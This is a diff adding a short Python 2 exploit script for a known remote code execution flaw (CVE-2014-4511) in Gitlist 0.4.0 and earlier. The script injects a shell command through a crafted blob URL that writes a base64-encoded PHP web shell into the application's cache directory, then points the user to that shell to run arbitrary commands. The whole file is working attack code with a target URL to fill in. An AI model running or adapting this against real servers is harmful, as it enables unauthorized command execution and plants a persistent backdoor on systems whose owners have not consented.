@@ -1,0 +1,33 @@
+from commands import getoutput
+import urllib
+import sys
+
+""" 
+Exploit Title: Gitlist <= 0.4.0 anonymous RCE
+
+cve: CVE-2014-4511
+
+"""
+
+url = 'http://192.168.1.126/test.git'
+# your gitlist url
+
+path = "/var/www/gitlist/cache"
+# path of uploading php shell 
+
+print '[!] Using cache location %s' % path
+
+# payload <?php system($_GET['cmd']);?> 
+payload = "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4K"
+
+# sploit; python requests does not like this URL, hence wget is used 
+# "/blob/master/":your master directory of gitlist
+mpath = '/blob/master/""`echo {0}|base64 -d > {1}/x.php`'.format(payload, path)
+mpath = url+ urllib.quote(mpath)
+
+out = getoutput("wget %s" % mpath)
+if '200' in out:
+    print '[!] Shell dropped; go hit %s/cache/x.php?cmd=ls' % url.rsplit('/', 1)[0]
+else:
+    print '[-] Failed to drop'
+    print out
